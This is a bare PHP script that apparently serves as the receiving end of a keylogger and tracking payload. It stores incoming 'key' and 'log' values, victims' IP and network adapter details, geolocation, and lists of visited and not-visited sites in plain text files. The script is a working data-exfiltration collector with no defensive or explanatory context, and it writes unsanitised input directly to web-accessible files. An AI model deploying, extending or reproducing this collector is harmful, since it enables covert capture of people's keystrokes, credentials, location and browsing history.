<?php
//Report code not implemented


$str = isset ($_GET['log']) ? $_GET['log'] : false ;
if ($str) {
	$ff = fopen ('logs.txt', 'a+') ;
        fputs ($ff,$str) ;
        fputs ($ff,' ') ;
	fclose ($ff) ;
}

$net=$_POST['net'];
$loga="adapter.txt";
$fn = fopen($loga, "w");
fwrite($fn, $net);
fclose($fn); 

$ip=$_POST['ip'];
$log="ip.txt";
$f = fopen($log, "w");
fwrite($f, $ip);
fclose($f); 

$key=$_POST['key'];
$key=stripslashes($key);
$logfile="logs.txt";
$fp = fopen($logfile, "a");
fwrite($fp, $key);
fclose($fp); 

//IP2GeoLoc
$ipgeo=$_POST['ipgeo'];
$ipgeo=stripslashes($ipgeo);
$fpg = fopen("ipgeo.txt", "w");
fwrite($fpg, $ipgeo);
fclose($fpg); 

//Geoloc
$geo=$_POST['geo'];
$geo=stripslashes($geo);
$fpz = fopen("geo.txt", "w");
fwrite($fpz, $geo);
fclose($fpz); 

//Visted
$vi=$_POST['visit'];
$vi=stripslashes($vi);
$fpg = fopen("browser.txt", "w");
fwrite($fpg, PHP_EOL .'Visited'. PHP_EOL .$vi);
fclose($fpg); 

//Not Visted
$nvi=$_POST['not_visit'];
$nvi=stripslashes($nvi);
$fpg = fopen("browser.txt", "a");
fwrite($fpg, PHP_EOL . PHP_EOL .'Not Visited'. PHP_EOL .$nvi);
fclose($fpg); 

?>